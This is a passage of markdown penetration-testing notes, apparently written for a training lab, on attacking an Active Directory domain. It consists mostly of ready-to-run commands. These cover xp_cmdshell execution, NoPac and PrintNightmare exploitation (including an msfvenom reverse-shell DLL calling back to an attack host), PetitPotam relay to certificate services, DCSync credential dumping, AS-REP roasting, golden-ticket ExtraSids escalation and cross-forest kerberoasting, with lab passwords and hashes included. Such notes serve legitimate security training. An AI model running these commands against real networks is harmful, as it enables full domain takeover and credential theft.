Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

MSSQL Authentication from Linux
```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

# Check Avaliable COmmands
SQL> help

# Try Enabling xp_cmdshell
SQL> enable_xp_cmdshell

# Usage
xp_cmdshell whoami /priv
```

#### Double Hop Issue
If in a WinRM / Powershell sessions and are experiencing issues like:
 ```bash 
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname

Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
   + FullyQualifiedErrorId : DirectoryServicesCOMException
```
It is most likely due to the Double Hop Issue when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second.

Check Cached Kerberos Tickets to Verify if this could be causing the issue
```bash
klist
```

To workaround this set up PSCredentials
```bash
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```

Another solutions when in GUI session in PowerShell could be to regester a new session configuration using the Register-PSSessionConfiguration cmdlet
```bash
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

Restart-Service WinRM

Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```

Now try the Command with Credentials and it should work
```bash
get-domainuser -spn -credential $Cred | select samaccountname
```

#### NoPac (SamAccountName Spoofing)
Reading: `https://www.sophos.com/en-us/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware`

Installing Impacket 
```bash
git clone https://github.com/SecureAuthCorp/impacket.git

python setup.py install 
```

Cloning the NoPac Exploit Repo
```bash
git clone https://github.com/Ridter/noPac.git
```

Check If the System is vulnerable to NoPac
```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

Running NoPac to get a Shell
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

Use NoPac to perform DCSync
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

#### PrintNightmare
Installiation
```bash
# Cloning the Exploit
git clone https://github.com/cube0x0/CVE-2021-1675.git

# Make Sure Impacket is installed
```

Enumerating for MS-RPRN
```bash
# Check if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

Or On Windows Machine (`https://github.com/itzvenom/Security-Assessment-PS`)
```bash
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Generating DLL Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

Creating a Share
```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```
Starting MSFF multi/handler
```bash
msfconsole

use exploit/multi/handler

set PAYLOAD windows/x64/meterpreter/reverse_tcp

set LHOST 172.16.5.225

set LPORT 8080

run
```

Running the Exploit
```bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

Getting the SYSTEM Shell (In Multihandler)
```bash
shell

whoami
```

#### PetitPotam

Starting ntlmrelay.py
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

Running PetitPotam.py (`https://github.com/topotam/PetitPotam`)
```bash
# Attack Host IP then Domain Controller IP
python3 PetitPotam.py 172.16.5.225 172.16.5.5 
```
This can also be run from a windows host using the Mimikatz module module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. Or a PowerShell implementation Invoke-PetitPotam.ps1 `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1`


Requesting a TGT Using gettgtpkinit.py
```bash
# Use Certificate from NTLMRELAYX.py
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <Base_64_User_Certificate> dc01.ccache
```


Setting the KRB5CCNAME Environment Variable
```bash
# Attack host will then use this file for Kerberos authentication attempts
export KRB5CCNAME=dc01.ccache
```

Could Aslo Directly Submit TGS Request Using getnthash.py and the AS-REP Key From orginial TGT request
```bash
# Or using the AS-REP key 
python /opt/PKINITtools/getnthash.py -key <AS-REP_key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

Using Domain Controller TGT to DCSync
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Or If Using AS-REP key and Gained NTLM Hash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

Confirming Admin Access to the Domain Controller
```bash
# Using the nthash from secrets dump
crackmapexec smb 172.16.5.5 -u administrator -H <hash>
```

Can also request TGT From Windows Machine With Rebeus, Using Cert From Ntlmrelay
```bash
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<cert> /ptt
```

And Then Perfrom DSYnc with mimikatz
```bash
klist

.\mimikatz.exe

lsadump::dcsync /user:inlanefreight\krbtgt
```

#### Enumerating DNS
Using adidnsdump
```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
# can use -r to attempt to reslove unkown records
```

Reading Records
```bash
cat records.csv
```

#### ASREP Roasting
Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```bash 
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

Retrieving AS-REP in Proper Format using Rubeus
```bash 
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Crack in hashcat using mode 18200
```

Or From Remote Linux
```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 

# Or
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```


### Domain Trusts
#### Enumeration
Using Get-ADTrust
```bash
Import-Module activedirectory
Get-ADTrust -Filter *
```

Checking for Existing Trusts using Get-DomainTrust (PowerView)
```bash
Get-DomainTrust
```

Using Get-DomainTrustMapping (PowerView)
```bash
Get-DomainTrustMapping
```

Checking Users in the Child Domain using Get-DomainUser (PowerView)
```bash
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

Using netdom to query domain trust
```bash
netdom query /domain:inlanefreight.local trust
```

Using netdom to query domain controllers
```bash
netdom query /domain:inlanefreight.local dc
```

Using netdom to query workstations and servers
```bash
netdom query /domain:inlanefreight.local workstation
```

#### ExtraSids Attack (Windows)
Attack Requirements:
1. The KRBTGT hash for the child domain
2. The SID for the child domain
3. The name of a target user in the child domain (does not need to exist!)
4. The FQDN of the child domain.
5. The SID of the Enterprise Admins group of the root domain.
6. With this data collected, the attack can be performed with Mimikatz.

1\. Obtaining the KRBTGT Account's NT Hash using Mimikatz
```bash
.\mimikatz.exe
lsadump::dcsync /user:LOGISTICS\krbtgt
```

2\. Using Get-DomainSID (PowerView)
```bash
Get-DomainSID
```

3\. Can be Anything (hacker for example)

4\. The Compromised Child Domain (LOGISTICS.INLANEFREIGHT.LOCAL)

5\. Obtaining Enterprise Admins Group's SID using Get-DomainGroup
```bash
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

6\. Creating a Golden Ticket with Mimikatz
```bash
.\mimikatz.exe


# Format 3:4:2:1:5
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

6\. Or With Rubeus
```bash
# Format 1:4:2:5:3
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

Confirming a Kerberos Ticket is in Memory Using klist
```bash
klist
```

Listing the Entire C: Drive of the Domain Controller
```bash
ls \\academy-ea-dc01.inlanefreight.local\c$
```

Performing a DCSync Attack against Parent Domain, targeting the Domain Admin user
```bash
.\mimikatz.exe

lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

#### ExtraSids Attack (Linux)
Works From Compromised Child to Parent Trusts, Allowing potential DC Compromise


1\. Dsync to Get KRBTGT hash with secretsdump.py
```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

2\. Performing SID Brute Forcing using lookupsid.py
```bash 
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

3\. Can be Anything (hacker for example)

4\. The Compromised Child Domain (LOGISTICS.INLANEFREIGHT.LOCAL)

5\. Grabbing the Domain SID & Attaching to Enterprise Admin's RID
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# Make sure to at Enterpise Admin's RID (-519) to the end
```

6\. Constructing a Golden Ticket using ticketer.py (`https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py`)
```bash
# Format 1:4:2:5:3
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# Setting the KRB5CCNAME Environment Variable
export KRB5CCNAME=hacker.ccache 

```

Getting a SYSTEM shell using Impacket's psexec.py
```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

Or Dumping Specific User Secrets with secretsdump.py
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/bross -k -no-pass LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local
```

Automating this attack with raiseChild.py (`https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py`)
```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

#### Cross-Forest Kerberoasting (From Windows)
Enumerating Accounts for Associated SPNs Using Get-DomainUser (PowerView)
```bash
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

Enumerating the SPN (mssqlsvc in this case) Account
```bash
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
```bash
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

#### Admin Password Re-Use & Group Membership (From Windows)
Using Get-DomainForeignGroupMember (PowerView)
```bash
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

Using admin credntials on current box to Enter-PSSession
on a different box with the shared built in Administrator account
```bash
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

#### Cross-Forest Kerberoasting (From Linux)
Using GetUserSPNs.py
```bash 
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

---



---

**End of notes.**
